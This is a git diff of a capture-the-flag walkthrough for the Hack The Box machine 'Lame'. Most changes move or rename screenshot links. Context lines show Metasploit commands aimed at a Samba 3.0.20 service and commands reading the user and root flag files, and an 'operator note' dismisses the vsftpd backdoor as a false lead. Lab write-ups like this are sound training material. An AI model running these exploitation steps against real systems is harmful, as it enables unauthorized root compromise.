@@ -20,7 +20,7 @@ The target exposes two critical vectors: a `vsftpd` backdoor (which is a "False 
 
 *A visual representation of the exploit path, highlighting the strategic pivot from the false lead.*
 
-![Lame Attack Graph](Assets/image.jpg)
+![Lame Attack Graph](Assets/Screenshot%202026-01-23%20015705.jpg)
 
 ---
 
@@ -34,10 +34,11 @@ The scan reveals a rich, albeit dated, attack surface:
 * **Port 445:** `Samba 3.0.20-Debian` (The primary target).
 * **OS:** Debian (Unix).
 
+![Lame Attack Graph](Assets/image.png)
+
+
 > *Operator Note: While `vsftpd 2.3.4` is flagged as vulnerable, it often fails on this target due to firewall restrictions or specific build configurations. Novice attackers get stuck here. Experienced operators identify this as a "False Lead" and pivot immediately to the higher-probability SMB vector.*
-```
-    ![Nmap Scan Results](Assets/image.png)
- ```
+
 ---
 
 ## 4. Exploitation: The Legacy Bridge
@@ -58,9 +59,13 @@ msf6 > set RHOSTS 10.129.2.224
 msf6 > set LHOST tun0
 msf6 > exploit
 ```
+
+![Lame Attack Graph](Assets/image3.png)
+
 ```markdown
     ![Metasploit Execution Success](Assets/image 4.png)
 ```
+
 
 ---
 
@@ -81,7 +86,7 @@ We retrieve the flags directly to confirm total compromise.
 * `cat /home/makis/user.txt`
 * `cat /root/root.txt`
 
-![Root Access Verification](Assets/image 5.png)
+![Lame Attack Graph](Assets/image 5.png)
 
 ---
 
